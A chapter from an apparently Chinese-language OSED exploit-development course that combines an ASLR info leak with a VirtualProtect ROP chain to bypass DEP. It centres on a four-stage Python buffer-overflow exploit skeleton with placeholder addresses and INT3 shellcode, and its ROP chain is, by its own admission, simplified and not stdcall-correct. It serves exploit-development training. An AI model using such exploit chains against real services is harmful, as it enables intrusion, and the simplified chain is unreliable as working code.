# Ch 33 — ASLR + DEP 合體完整鏈

> **目標**：把 Part 7（DEP/ROP）和 Part 8（ASLR）兩條分開學的技法合起來，組出一個現代 OSED exploit 真正的樣貌：先用 leak 原語洩漏位址、在 Python 端動態算出模組基址、用這個基址重定位所有 ROP gadget 與 `VirtualProtect` 位址、組出完整 ROP chain 繞過 DEP、最後跳進 shellcode。這一章的重點不是任何單一技法（那些 Ch 27–32 都講過了），而是把它們串成一個**兩階段互動**的 exploit 腳本結構——這正是 OSED 考場上你會真正寫出來的那種腳本。
>
> **環境**：Win10 x64 + WinDbg（2026）+ mona v3 + Python3

---

## 為什麼需要這個？

到目前為止，Part 7 教你「有了固定的 gadget 位址，怎麼組 ROP chain 呼叫 `VirtualProtect` 繞過 DEP」；Part 8 教你「位址會被 ASLR 隨機化時，怎麼 leak 一個位址再算出基址」。但這兩件事單獨講都還是「半成品」——真實世界（和 OSED 考場）的目標程式幾乎同時要面對兩道牆：**DEP 讓你不能直接執行 shellcode，ASLR 讓你不知道該往哪跳**。

這一章要處理的核心問題是**順序和資料流**：你不能先把 ROP chain 寫死進 payload 再送出去，因為 chain 裡每一個 gadget 的位址都依賴一個「這次開機才知道」的基址。你必須先跟靶機交換一次資料（拿到 leak），**在你自己的 Python 腳本裡做完所有運算**，再組出第二份、真正會送出去的 payload。這種「先問、再算、再打」的兩階段結構，是本章要建立的核心心智模型，也是和 Part 2–7 那些「一次性送出單一 payload」的練習最大的結構差異。

## 先建立直覺：完整現代 exploit 的樣貌

把整條鏈畫成一張總覽圖，之後每一節都會回頭對照這張圖的某一段：

```
┌─────────────────────────────────────────────────────────────────────┐
│  階段 0：靜態分析（在你自己機器上，exploit 寫之前就做好）             │
│  ─────────────────────────────────────────────────────────────────  │
│  - 用 IDA 開目標模組（和靶機同版本）                                  │
│  - 記下：leak 會洩漏的 symbol 的 RVA                                  │
│  - 記下：要用的每個 ROP gadget 的 RVA                                 │
│  - 記下：VirtualProtect 的 RVA（在 kernel32.dll 裡，若它也隨機化）     │
└───────────────────────────┬───────────────────────────────────────────┘
                            ↓ 這些 RVA 是常數，寫進腳本裡，不會變
┌─────────────────────────────────────────────────────────────────────┐
│  階段 1：第一次連線 — 觸發 leak（Ch 32）                               │
│  ─────────────────────────────────────────────────────────────────  │
│  Python 送出「leak payload」→ 靶機回應 → 解析出 leaked_addr            │
└───────────────────────────┬───────────────────────────────────────────┘
                            ↓ Python 端運算（不碰靶機）
┌─────────────────────────────────────────────────────────────────────┐
│  階段 2：Python 端算位址                                              │
│  ─────────────────────────────────────────────────────────────────  │
│  module_base      = leaked_addr - leaked_symbol_rva                  │
│  gadget_1_addr     = module_base + gadget_1_rva                      │
│  gadget_2_addr     = module_base + gadget_2_rva                      │
│  ...                                                                  │
│  virtualprotect_addr = module_base + vp_rva   （或另一個模組的基址）   │
└───────────────────────────┬───────────────────────────────────────────┘
                            ↓ 用算好的位址組出真正的 payload
┌─────────────────────────────────────────────────────────────────────┐
│  階段 3：組 ROP chain（Part 7 的方法論，位址換成動態算出的值）          │
│  ─────────────────────────────────────────────────────────────────  │
│  [pop eax; ret] [NewProtect] [pop ebx; ret] [...] ... [VirtualProtect]│
│  → 讓返回時呼叫 VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, ..) │
│  → shellcode 所在的 stack 區域被標記為可執行                          │
└───────────────────────────┬───────────────────────────────────────────┘
                            ↓ chain 執行完後 EIP 落到 shellcode
┌─────────────────────────────────────────────────────────────────────┐
│  階段 4：第二次連線（或同一連線延續）— 送出完整 overflow payload       │
│  ─────────────────────────────────────────────────────────────────  │
│  ROP chain + shellcode 一次送出 → 觸發 overflow → EIP 被劫持          │
│  → 依序跑過 chain → VirtualProtect 執行成功 → 跳進 shellcode          │
└─────────────────────────────────────────────────────────────────────┘
```

這張圖裡最容易被新手忽略的是**階段 2 完全不碰靶機**——它是純粹的 Python 算術，發生在你自己的攻擊機上，跟靶機沒有任何網路互動。搞懂這一點，下面的兩階段骨架就很好理解了。

## 核心機制一：為什麼不能把 ROP chain 寫死

回顧 Part 7 的練習（練習 E）：那裡的 ROP chain 位址都是從一個**固定**模組（沒開 ASLR，或你直接假設整個環境沒開 ASLR）裡找到的，寫死進腳本沒問題，因為它們永遠不變。

但 Ch 32 已經說明，如果目標模組全部開了 ASLR，這些位址**每次開機都不同**。如果你還是把 Part 7 那種「寫死位址」的 payload 直接套用，exploit 會在下一次開機後失效——而且失效的方式往往不是乾淨地報錯，而是讓程式跳到一個隨機位址，產生難以診斷的二次崩潰。

```
Part 7 練習 E 的 payload（假設沒有 ASLR）：

  payload = (b"A" * offset
             + p32(0x625011AF)      # pop eax; ret —— 寫死，因為模組位址固定
             + p32(0x00001000)      # NewSize
             + p32(0x625022CC)      # pop ebx; ret —— 寫死
             + ...)


本章的 payload（目標模組開了 ASLR）：

  module_base = 計算出來的這次開機的實際基址     # 每次執行這個腳本時都要重新算
  payload = (b"A" * offset
             + p32(module_base + POP_EAX_RET_RVA)   # 動態算出來的位址
             + p32(0x00001000)
             + p32(module_base + POP_EBX_RET_RVA)   # 動態算出來的位址
             + ...)
```

兩段程式碼的「形狀」完全一樣——組 chain 的邏輯、gadget 的種類、呼叫慣例的安排，Part 7 教的東西一個字都沒變。**唯一的差異是位址從常數變成變數**，而這個變數的值，來自階段 1 的 leak 和階段 2 的運算。這是本章要傳達的最重要的一件事：**ASLR bypass 不是另一套全新技法，是把 Part 7 的技法套進一層「先算位址」的外殼**。

## 核心機制二：重定位 VirtualProtect 位址

`VirtualProtect` 本身住在 `kernel32.dll` 裡，這個模組幾乎必然開著 ASLR（它是系統 DLL）。所以即使你用 Ch 31 的辦法找到了一個非 ASLR 的第三方模組來放 ROP gadget（`pop`/`ret` 這類小片段很好找），你呼叫 `VirtualProtect` 這個真正的 Win32 API 時，**它的位址一樣要透過 leak + 算基址的方式取得**，不能用固定值。

這也是 OSED 題目常見的混合情境：

```
情境：essfunc.dll（第三方模組）沒開 ASLR，kernel32.dll 開了 ASLR

  → pop/ret 之類的小 gadget：直接從 essfunc.dll 找，位址寫死即可（Ch 31）
  → VirtualProtect 本體：必須先 leak 出 kernel32.dll 的基址，再加上
    VirtualProtect 在 kernel32.dll 裡的 RVA（靜態分析得到）

  兩種位址來源在同一條 ROP chain 裡並存，互不衝突：
    chain = [essfunc 裡的固定 gadget, ..., 動態算出的 VirtualProtect 位址, ...]
```

**取得 `VirtualProtect` RVA 的方法**：用 IDA 開你靶機上那個版本的 `kernel32.dll`（或對應的 `kernelbase.dll`——現代 Windows 很多 Win32 API 的實作其實轉發自 `kernelbase.dll`，匯出名稱還是在 `kernel32.dll` 的 export table，但實際程式碼可能在 `kernelbase.dll` 裡，這點在不同 Windows 版本行為不同，動手前務必在自己靶機確認），找到 `VirtualProtect` 的匯出位址，減去模組的 `ImageBase`，得到 RVA。

## 核心機制三：兩階段互動的腳本結構

這是本章要落地的具體產出。完整 exploit 腳本在結構上要分成清楚的三塊：**常數區**（靜態分析結果）、**leak 階段函式**、**組 chain + 送出階段函式**。

### 完整骨架（未實測，理論預期）

```python
#!/usr/bin/env python3
"""
aslr_dep_full_chain.py
ASLR + DEP 合體完整鏈 —— 兩階段骨架

未實測，理論預期。所有 RVA、offset、payload 格式都是示意值，
必須在你自己的靶機用 IDA + WinDbg + mona 實測取得真實數字，
下方「驗證法」一節逐步說明怎麼取得。
"""
import socket
import struct
import sys

# ============================================================
# 常數區 —— 全部來自「靜態分析」（IDA 開目標模組，和靶機同版本）
# 這些數字不隨開機改變，只跟你分析的那一份 binary 有關
# ============================================================

TARGET_IP   = "192.168.x.x"
TARGET_PORT = 9999

# --- leak 相關 ---
LEAK_SYMBOL_RVA   = 0x12AB0     # 會被 leak 出來的函式/符號，在它所屬模組裡的 RVA
LEAK_MODULE_NAME  = "target.exe"  # 這個 leak 到的位址屬於哪個模組（只是註記用）

# --- essfunc.dll：假設這個模組沒開 ASLR（Ch 31），gadget 位址可以寫死 ---
ESSFUNC_BASE        = 0x10000000          # !py mona modules 看到的固定基址
POP_EAX_RET_RVA     = 0x00011AF
POP_EBX_RET_RVA     = 0x00022CC
POP_ECX_RET_RVA     = 0x0003A10
PUSHAD_RVA          = 0x0004120           # 一次把暫存器狀態推上 stack，常見於 shellcode 跳轉前

# --- kernel32.dll：開著 ASLR，位址要靠 leak 動態算（Ch 32） ---
VIRTUALPROTECT_RVA  = 0x0005ABC0          # VirtualProtect 在 kernel32.dll 裡的 RVA

# --- payload 佈局 ---
OFFSET_TO_EIP   = 2606          # 用 cyclic pattern 量出來（Ch 8 的方法）
SHELLCODE_SIZE  = 350           # 預留給 shellcode 的空間大小


def p32(v: int) -> bytes:
    return struct.pack("<I", v & 0xFFFFFFFF)


# ============================================================
# 階段 1：觸發 leak，拿到靶機這次開機的實際位址
# ============================================================

def stage1_leak(sock: socket.socket) -> int:
    """送出觸發 leak 的指令，解析回應取出洩漏的位址"""
    leak_cmd = b"INFO\r\n"          # 示意指令，依實際逆向出來的協定替換
    sock.send(leak_cmd)
    resp = sock.recv(4096)

    # 示意：假設洩漏的位址以 little-endian 4 bytes 出現在回應的固定 offset
    # 實際 offset 必須在 WinDbg 裡逐 byte 核對回應內容後才能確定
    LEAK_OFFSET_IN_RESPONSE = 16
    leaked_addr = struct.unpack(
        "<I", resp[LEAK_OFFSET_IN_RESPONSE:LEAK_OFFSET_IN_RESPONSE + 4]
    )[0]
    print(f"[*] stage1: leaked_addr = 0x{leaked_addr:08X}")
    return leaked_addr


# ============================================================
# 階段 2：Python 端算位址（完全不碰靶機，純算術）
# ============================================================

def stage2_calc_addresses(leaked_addr: int) -> dict:
    module_base = leaked_addr - LEAK_SYMBOL_RVA

    if module_base % 0x10000 != 0:
        print(f"[!] module_base 0x{module_base:08X} 沒有對齊到 0x10000，"
              f"RVA 可能算錯，或 leak 到的值根本不是預期的 symbol")
        sys.exit(1)

    addrs = {
        "module_base":       module_base,
        "virtualprotect":    module_base + VIRTUALPROTECT_RVA,
        "pop_eax_ret":       ESSFUNC_BASE + POP_EAX_RET_RVA,
        "pop_ebx_ret":       ESSFUNC_BASE + POP_EBX_RET_RVA,
        "pop_ecx_ret":       ESSFUNC_BASE + POP_ECX_RET_RVA,
        "pushad":            ESSFUNC_BASE + PUSHAD_RVA,
    }

    print("[*] stage2: 算出來的位址：")
    for name, addr in addrs.items():
        print(f"    {name:18s} = 0x{addr:08X}")

    return addrs


# ============================================================
# 階段 3：組 ROP chain（Part 7 方法論，位址換成階段 2 算出來的值）
# ============================================================

def stage3_build_rop_chain(addrs: dict, shellcode_addr_guess: int) -> bytes:
    """
    目標：讓 ROP chain 呼叫
        VirtualProtect(shellcode_addr_guess, SHELLCODE_SIZE,
                        PAGE_EXECUTE_READWRITE, &old_protect)
    再跳回 shellcode 所在位置執行。

    這裡用的是 Part 7（Ch 29）教的標準 VirtualProtect ROP chain 排列法：
    用 pop/ret gadget 把四個參數依序放上 stack，最後 ret 到 VirtualProtect，
    VirtualProtect 執行完 ret 時跳到緊接著放的 shellcode 位址。

    注意：真實的 gadget 需求（哪些暫存器要被哪個 pop 填入）取決於
    essfunc.dll 裡實際找到的 gadget 種類，這裡的排列是示意，
    不代表任何真實模組的 gadget 組合。
    """
    chain = b""

    # 示意：把 VirtualProtect 的四個參數用某種 pop 序列準備好
    # 實際排列方式需要配合 Ch 28/29 教的 mona rop 自動產生邏輯做調整
    old_protect_writable_addr = addrs["module_base"] + 0x9000  # 示意：一個可寫位置

    chain += p32(addrs["pop_eax_ret"])
    chain += p32(shellcode_addr_guess)          # lpAddress
    chain += p32(addrs["pop_ebx_ret"])
    chain += p32(SHELLCODE_SIZE)                 # dwSize
    chain += p32(addrs["pop_ecx_ret"])
    chain += p32(0x40)                           # flNewProtect = PAGE_EXECUTE_READWRITE
    chain += p32(addrs["virtualprotect"])        # 跳進 VirtualProtect
    chain += p32(shellcode_addr_guess)           # VirtualProtect 完成後的返回位址 = shellcode

    print(f"[*] stage3: ROP chain 長度 = {len(chain)} bytes")
    return chain


# ============================================================
# 階段 4：組完整 payload，第二次（或延續同一連線）送出真正的 overflow
# ============================================================

def stage4_build_and_send(sock: socket.socket, rop_chain: bytes):
    shellcode_placeholder = b"\xcc" * SHELLCODE_SIZE   # 先用 INT3 驗證落點，之後換 Part 6 的真 shellcode

    payload  = b"A" * OFFSET_TO_EIP
    payload += rop_chain
    payload += shellcode_placeholder

    buf = b"OVERFLOWCMD " + payload + b"\r\n"           # 示意指令前綴，依實際協定替換
    print(f"[*] stage4: 完整 payload 長度 = {len(payload)} bytes，送出中...")
    sock.send(buf)


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))

    leaked_addr = stage1_leak(s)
    addrs       = stage2_calc_addresses(leaked_addr)

    # shellcode 最終會落在 stack 上，具體位址通常也需要靠 leak 或已知的
    # stack 相對 offset 估算；這裡示意直接假設已經另外算出一個猜測值
    shellcode_addr_guess = 0x0012FF00   # 未實測，理論預期：實際需配合 Ch 25 PEB 技巧或額外 leak

    rop_chain = stage3_build_rop_chain(addrs, shellcode_addr_guess)
    stage4_build_and_send(s, rop_chain)

    try:
        s.recv(1024)
    except socket.error:
        pass
    s.close()
    print("[+] exploit 送出完畢")


if __name__ == "__main__":
    main()
```

> **未實測，理論預期**：這份骨架的協定指令（`INFO`、`OVERFLOWCMD`）、leak 回應裡的 offset、所有 RVA 數字、`shellcode_addr_guess` 都是示意值，不對應任何真實目標。它的價值在於**結構**——四個階段函式分工清楚、常數區和運算區分離——這個結構請原封不動套用到你實際的靶機上，只替換裡面的數字和協定細節。

### 驗證法：怎麼把骨架套到真實靶機

1. **先確認 leak 原語真實存在**：對靶機送出你懷疑的 leak 指令，在 WinDbg 裡用 `bp` 在處理函式設斷點，單步走過去，確認回應裡真的有一個落在合理模組範圍的位址，記下它在回應 buffer 裡的精確 offset。
2. **用 `lm` 核對 leak 到的位址屬於哪個模組**：WinDbg 裡 `lm` 列出所有模組的 base/size，看 leaked_addr 落在哪個範圍內。
3. **用 IDA 找 LEAK_SYMBOL_RVA**：確認 leak 原語洩漏的究竟是哪個函式/符號，在 IDA 裡找到它的位址，減去模組 ImageBase 得到 RVA。
4. **用 `!py mona modules` 確認 essfunc.dll（或你實際用的固定模組）真的 `ASLR: False`**：這一步在 Ch 31 做過，這裡重新核對一次，因為不同靶機配置可能不同。
5. **用 `!py mona rop -m essfunc.dll -cpb "\x00\x0a\x0d"` 或手動搜尋拿到真實的 gadget RVA**，取代骨架裡的示意值。
6. **用 IDA 開靶機上實際的 `kernel32.dll`（或 `kernelbase.dll`）版本，找 `VirtualProtect` 的真實 RVA**。
7. **分段驗證**：先只跑階段 1+2，印出算出來的位址，手動在 WinDbg 裡用 `db`/`u` 核對那個位址真的是你期待的函式/gadget 開頭（`u 位址` 應該顯示出像 `pop eax` / `ret` 這種合理指令，不是垃圾 byte）。確認無誤後才接上階段 3+4 真正送出 overflow。
8. **先用 `INT3`（`0xCC`）佔位 shellcode**，在 WinDbg 裡確認 EIP 真的落在 `0xCC` 那段（代表 ROP chain 完整跑通，`VirtualProtect` 真的執行成功），最後才換成 Part 6 寫好的 bad-char-free shellcode。

## 底層機制：整條鏈在 CPU/stack 層面實際發生的事

把階段 3 的 chain 對應到 stack 上的實際排列，理解它為什麼能工作：

```
stack（由低位址往高位址）：

  [junk × OFFSET_TO_EIP]
  [pop_eax_ret]              ← overflow 蓋到的 return address，第一個被 ret 到的地方
  [shellcode_addr_guess]     ← pop_eax_ret 執行時，這個值被 pop 進 EAX
  [pop_ebx_ret]               ← 接著 ret 到這裡
  [SHELLCODE_SIZE]            ← pop 進 EBX
  [pop_ecx_ret]               ← 再 ret 到這裡
  [0x40]                      ← pop 進 ECX
  [virtualprotect]            ← 再 ret 到這裡 == 直接呼叫 VirtualProtect
  [shellcode_addr_guess]      ← VirtualProtect 內部執行完 `ret` 時，
                                 把這個值當成返回位址 pop 出來並跳過去
  [shellcode bytes...]        ← EIP 落地的地方，開始執行

執行軌跡：
  ret → pop_eax_ret:  EAX = shellcode_addr_guess；ret（取下一個 stack 值當新 EIP）
  ret → pop_ebx_ret:  EBX = SHELLCODE_SIZE；ret
  ret → pop_ecx_ret:  ECX = 0x40；ret
  ret → virtualprotect:
      　CPU 把 EAX/EBX/ECX 當成某種呼叫慣例的引數來源
       （實際上 x86 stdcall 的 VirtualProtect 需要四個 stack 參數，
        這裡用 pop/ret 把參數準備到 stack 上正確位置，上面是簡化示意，
        真實排列需按 Ch 29 教的 stdcall 參數佈局方法精確對齊）
      　VirtualProtect 執行 → 把 shellcode_addr_guess 所在的頁改成可執行
      　VirtualProtect 內部 `ret` → 彈出 stack 上留的返回位址 = shellcode_addr_guess
  EIP = shellcode_addr_guess → 開始執行 shellcode
```

> 這張圖簡化了 `VirtualProtect` 真實的 `stdcall` 參數傳遞細節（四個參數在 stack 上的精確順序和 `lpflOldProtect` 需要一個可寫位址這件事），完整排法是 Ch 29（`29-virtualprotect-rop-chain.md`）的主題，本章假設讀者已經看過那一章，這裡只強調「位址來源變成動態算出的值」這一層新增的複雜度。

## 常見失敗模式

這是本章最重要的除錯視角——合體鏈比單一技法多了「兩階段互動」帶來的新失敗面，光是 Ch 27–32 各自教的坑踩過一輪還不夠，以下是把它們組起來後特有的失敗模式：

### 失敗 1：基址算錯

**症狀**：WinDbg 裡 EIP 落在一個完全不合理的位址（不在任何已知模組範圍內），或者程式在 ROP chain 跑到一半前就先崩潰在奇怪的地方。

**原因**：`LEAK_SYMBOL_RVA` 抓錯了符號，或者算式方向弄反（寫成 `leaked_addr + rva` 而不是 `leaked_addr - rva`）。

**排錯方法**：先單獨跑階段 1+2，印出 `module_base`，用 WinDbg 的 `lm` 指令核對這個值是否真的等於某個模組當前的實際載入基址。如果對不上，回頭檢查 `LEAK_SYMBOL_RVA` 的靜態分析是否正確。

### 失敗 2：leak 格式解析錯

**症狀**：`module_base % 0x10000 != 0`，腳本自己的 alignment check 就先噴警告，或者算出來的值明顯不像一個合理的位址（例如全是小整數，不是 `0x00xxxxxx`～`0x7Fxxxxxx` 範圍）。

**原因**：解析回應時的 offset 抓錯，或者 byte 順序弄反（big-endian vs little-endian），或者回應本身包含可變長度的前綴（例如某個長度欄位會隨請求內容改變），導致固定 offset 的假設不成立。

**排錯方法**：在 WinDbg 裡直接看發出去的回應原始 bytes（用網路封包截取或在服務端下斷點印出 buffer 內容），逐 byte 核對你以為的 leaked_addr 位置是否正確。不要只在 Python 端猜 offset。

### 失敗 3：gadget RVA 取自不同版本模組

**症狀**：Ch 31 的固定模組（`essfunc.dll`）gadget 位址明明寫死、理論上不該出錯，但 ROP chain 執行到某個 `pop/ret` 時卻跳到一段不是 `pop`/`ret` 的指令，CPU 執行出乎意料的動作後崩潰。

**原因**：你在自己機器上用來找 gadget 的那份 `essfunc.dll`（或任何固定模組），和靶機上實際跑的那份版本不同——哪怕只是差一個 patch 版本，程式碼佈局可能整段位移，RVA 全部對不上。

**排錯方法**：核對檔案大小、`File Version`（右鍵「內容→詳細資料」或 `dumpbin /headers`）、甚至直接算 hash，確認分析端和靶機端是同一份二進位檔案。這個問題也可能發生在 `VirtualProtect` 的 RVA 上——`kernel32.dll` / `kernelbase.dll` 的版本在不同 Windows 更新之間會變。

### 失敗 4：shellcode 落點位址猜錯

**症狀**：ROP chain 前段（`VirtualProtect` 呼叫）都走得通，但最後跳到 `shellcode_addr_guess` 時 EIP 落在錯誤位置或再次崩潰。

**原因**：stack 上 shellcode 實際所在的位址，本身也可能受 stack ASLR 影響，寫死的猜測值不一定準。

**排錯方法**：如果只是 stack 位置的相對 offset 問題（不是整個 stack 基址隨機化），通常可以用 Ch 23 的 PEB walk 技巧讓 shellcode 自己定位自己（例如用 `jmp esp` 類的相對跳轉而不是絕對位址），或者在 ROP chain 最後一步改用「跳到 ESP 當前值」的 gadget（`jmp esp` / `push esp; ret`）取代寫死的絕對位址，這樣就不需要精確猜中 shellcode 的絕對位址。

## 對比取捨：純 DEP bypass vs 合體鏈

| 面向 | 純 DEP bypass（Part 7，假設沒有 ASLR） | ASLR + DEP 合體鏈（本章） |
|---|---|---|
| Payload 送出次數 | 通常一次 | 至少兩次互動（leak 一次 + overflow 一次），或同一連線分兩段送 |
| Gadget 位址 | 寫死常數 | 部分寫死（非 ASLR 模組）+ 部分動態算（開 ASLR 的模組） |
| 腳本複雜度 | 低（組 chain 即可） | 高（多一層 leak 解析 + 位址運算 + alignment 驗證） |
| 除錯難度 | 中（Ch 29 的踩雷） | 高（新增「基址算錯」「leak 解析錯」「版本不符」三類新失敗面） |
| 對靶機狀態的依賴 | 幾乎不依賴（位址固定） | 依賴「同一次開機內位址不變」，跨 reboot 要重新 leak |

## 踩雷集錦

1. **把 leak 和 overflow 塞進同一次送出**：有些人會想「既然都是送給同一個服務，寫一個 payload 一次包含 leak 觸發和真正的 overflow 不是更有效率？」——但階段 2 的 Python 端運算必須拿到 leak 的回應**之後**才能進行，兩者在時間上有嚴格的先後依賴，不能並行。除非目標協定本身支援你在同一個 TCP 連線裡分批送、分批收（多數簡單的練習靶的確支援），否則穩健做法是先完整收完 leak 的回應，再組出第二份 payload 送出。

2. **以為 RVA 是「絕對」不會變的東西**：RVA 是相對於某一份特定版本二進位檔案的常數，換一個 build（哪怕只是修了一行不相關的程式碼重新編譯）就可能全部跑位。靜態分析的結果要標注清楚「對應哪一份檔案（版本/hash）」，不要憑記憶套用到看起來差不多的另一個環境。

3. **忽略 `VirtualProtect` 本身也可能被 CFG 等更新的緩解機制攔下**：本章假設的是經典的 DEP+ASLR 組合，這也是 OSED EXP-301 考綱的主力範圍。如果你在更新的 Windows 11 環境碰到 CFG（Control Flow Guard）或更嚴格的緩解，`VirtualProtect` 的間接呼叫可能被攔截——這已經超出本章範圍，Ch 41（加深一圈）和 `windows_pwn` 課程會處理。

4. **把「階段 2 算出來的位址」直接拿去跟別的分析結果交叉比對時忘了單位**：常見筆誤是把 RVA 和絕對位址搞混（例如把某份 IDA 筆記裡記的絕對位址誤當 RVA 直接拿來加減），造成算出來的基址離題十萬八千里卻又「看起來像一個合理的數字」而沒被 alignment check 抓到（剛好也是 0x10000 倍數的巧合）。每個數字旁邊都標清楚是 RVA 還是絕對位址，是避免這類錯誤最直接的習慣。

5. **跨 reboot 重用舊的 leak 結果**：Ch 31/32 都強調過 Windows image ASLR 是 per-boot 固定，但「固定」只在同一次開機內有效。如果你把某次 leak 到的位址直接寫成常數存進腳本，下次重新開機後的那次執行一定會失敗——完整的 exploit 腳本**每次執行都要重新走一次階段 1+2**，不能圖方便跳過 leak 直接套用舊資料。

## 進階：再往深一層

- **把 leak 和 overflow 設計成同一個網路請求的不同階段**：某些協定允許你在同一個 TCP 連線裡先發一個查詢指令、收到回應後再發觸發 overflow 的指令，這比開兩個獨立連線更貼近真實服務的使用模式，也能避免某些服務因為連線行為異常而觸發額外的防護（例如連線次數限制）。
- **自動化 RVA 差異的版本容錯**：進階的 exploit 開發會寫一個小工具，根據靶機回報的版本資訊字串（如果協定裡有洩漏）自動切換一組對應版本的 RVA 常數表，而不是假設所有靶機都是同一個 build。這種「多版本 RVA 表」的做法在真實紅隊場景（面對的目標版本不可控）比教學環境更重要。
- **把整條鏈封裝成可重複使用的函式庫**：本章骨架故意寫成四個清楚分開的函式，是為了讓你之後面對不同靶機時，只需要替換 `stage1_leak`（協定細節）和常數區（RVA 數值），`stage2`/`stage3` 的運算邏輯幾乎可以原封不動複用——這也是為什麼 OSED 考場上「先把通用骨架寫好、再填空」比「每次從零手刻」快得多。

## 本章重點整理

- 現代完整 OSED exploit = Part 7（DEP/ROP）+ Part 8（ASLR）合起來的四階段流程：leak → Python 端算位址 → 組 ROP chain（換上動態位址）→ 送出 overflow 跳 shellcode。
- 核心心智模型是**兩階段互動**：階段 1/4 碰靶機（網路 I/O），階段 2/3 不碰靶機（純 Python 運算），四者在時間上嚴格依序執行，不能顛倒或省略。
- 同一條 ROP chain 可以混用「固定模組的寫死 gadget（Ch 31）」和「開 ASLR 模組的動態算出位址（Ch 32）」，兩種來源並存是常態，不是互斥選項。
- 合體鏈新增三類失敗面：基址算錯（RVA 方向/數值錯）、leak 格式解析錯（offset/byte 順序）、gadget RVA 取自不同版本模組——這些都不是 Part 7 或 Part 8 單獨存在時會碰到的，是「串接」本身帶來的新風險。
- 骨架的函式分工（leak / 算位址 / 組 chain / 送出）值得固定下來重複使用，換靶機時只需要替換協定細節和 RVA 常數。

## 自我檢核

- [ ] 能不看筆記畫出完整四階段流程圖，並說出哪些階段碰靶機、哪些階段純粹是 Python 端運算
- [ ] 能解釋為什麼同一條 ROP chain 裡可以同時出現「寫死的位址」和「動態算出的位址」，分別對應什麼情境
- [ ] 能列舉本章提到的四種常見失敗模式，並對每一種說出至少一個具體的排錯步驟
- [ ] 能說出為什麼「leak 到的值」和「要用來加減的 RVA」必須來自完全同一版本的二進位檔案，以及版本不符時會出現什麼症狀
- [ ] 能解釋為什麼完整 exploit 腳本每次執行都要重新走一次 leak，不能把上次算出的位址寫死成常數

## 延伸閱讀

- **[Ch 29 — 手工打造 VirtualProtect / VirtualAlloc ROP chain](./29-virtualprotect-rop-chain.md)**
  - 讀哪裡：`VirtualProtect` 的完整 stdcall 參數排列與 `lpflOldProtect` 可寫位址的處理方式。
  - 學什麼：本章階段 3 刻意簡化的 ROP chain 排列，在這一章有完整、精確的版本。
  - 前提：本章讀完後回頭補這一章的細節，兩邊會互相印證。
- **[Ch 31 — ASLR 復習 + 非隨機化模組利用](./31-aslr-nonrandomized-modules.md)** 與 **[Ch 32 — info leak 製造：部分覆寫、可預測位址](./32-info-leak-primitives.md)**
  - 讀哪裡：兩章全文。
  - 學什麼：本章混用的兩種位址來源（固定模組 / leak 算出）分別的完整原理，本章假設讀者已經讀過這兩章。
  - 前提：建議按順序讀完 Ch 31 → Ch 32 → 本章。
- **[windows_pwn Ch 24 — ASLR：Windows 特性 / leak / 部分覆寫](../windows_pwn/24-aslr.md)**
  - 讀哪裡：「場景 3：info leak + partial overwrite 配合」一節。
  - 學什麼：同樣的「leak → 計算 → ROP → shellcode」四步驟在 x64 環境下的對照版本，能幫助理解本章流程在考試用 x86 之外的適用性。
  - 前提：本章讀完後對照。
- **[windows_pwn Ch 31 — info leak 原語大全](../windows_pwn/31-info-leak-primitives.md)**
  - 讀哪裡：「資料流圖：info leak 如何餵給後續步驟」一節。
  - 學什麼：更複雜場景（heap grooming + OOB read）下的 leak → 計算 → 利用鏈，是本章資料流圖的進階版本。
  - 前提：本章讀完後對照，核心公式完全相同。
- **Corelan — "Exploit writing tutorial part 6: Bypassing Stack Cookies, SafeSEH, SEHOP, HW DEP and ASLR"**（[corelan.be](https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/)）
  - 讀哪裡：全文，這是 Corelan 系列裡第一次把 DEP 和 ASLR 繞過放在同一篇講的經典教材。
  - 學什麼：本章「合體鏈」概念的原始出處，和真實靶機示範的完整操作細節。
  - 前提：讀過 Part 7 和本章後再讀，會更清楚 Corelan 當年示範的每一步在對應本課哪一章。

ASLR 和 DEP 的合體鏈，是 OSED 考試裡 stack/SEH overflow 題型能拿到的最高複雜度組合，也是這門課 Part 7–8 要收束的終點。接下來換一條完全不同的漏洞類型——format string，它本身就是一種天然的 info leak 原語（本章 Ch 32 已經預告過），也能進化成任意寫，帶來另一條完全不同的控制流劫持路線。

→ [Ch 34 — format string 原理（%x/%n/%s，Windows vs Linux）](./34-format-string-principle.md)
